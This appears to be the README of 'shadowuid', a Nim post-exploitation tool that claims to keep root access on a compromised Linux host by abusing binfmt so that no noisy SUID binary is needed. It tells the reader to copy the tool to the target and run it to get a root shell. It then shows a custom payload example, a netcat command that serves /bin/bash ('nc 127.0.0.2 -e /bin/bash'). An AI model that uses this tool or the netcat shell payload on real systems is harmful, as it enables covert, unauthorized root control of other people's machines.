<div align=center>
<img src=./29FE64AD-A0EF-4A23-8FD3-D646071A74C8.png>
<pre><code><strong>Obtain persistance without using noisy and detectable SUID using <i>binfmt</i> </strong>
Also a good way to learn Nim and something new
</code></pre>
</div>

## Like at home 🏡 <sup>(persistance)</sup>

* First transfer `shadowuid` on target
* Run it!<br><pre><code>./shadowuid</code></pre>

And that's all, obtaining root shell is obtained and process to obtain it again will be outputted 


##### More granular

You can specify which SUID will trigger your payload. And, obviously, you can also custom the payload.
An example:
```shell
./shadowuid -x --command "nc 127.0.0.2 -e /bin/bash"
```
